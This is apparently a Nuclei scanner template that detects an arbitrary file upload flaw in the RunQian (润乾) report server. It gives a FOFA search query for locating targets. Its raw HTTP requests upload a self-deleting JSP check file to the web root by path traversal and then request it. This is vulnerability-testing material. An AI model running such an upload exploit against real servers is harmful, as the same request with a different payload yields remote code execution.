id: rqbb-fileupload-InputServlet

info:
  name: 润乾报表-任意文件上传-InputServlet
  author: Abbbbb
  severity: critical
  metadata: 
    fofa-query: title="润乾报表" || body="润乾报表"
variables:
  filename: "{{to_lower(rand_base(5))}}"

http:
  - raw:
      - |
        POST /servlet/dataSphereServlet?action=38 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Length: 397
        Content-Type: multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9
        
        --eac629ee4641cb0fe10596fba5e0c5d9
        Content-Disposition: form-data; name="openGrpxFile"; filename="{{filename}}.jsp"
        Content-Type: text/plain
        
        <%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        --eac629ee4641cb0fe10596fba5e0c5d9
        Content-Disposition: form-data; name="path"
        
        ../../../
        --eac629ee4641cb0fe10596fba5e0c5d9
        Content-Disposition: form-data; name="saveServer"
        
        1
        --eac629ee4641cb0fe10596fba5e0c5d9--

      - |
        GET /{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body_2,"12321")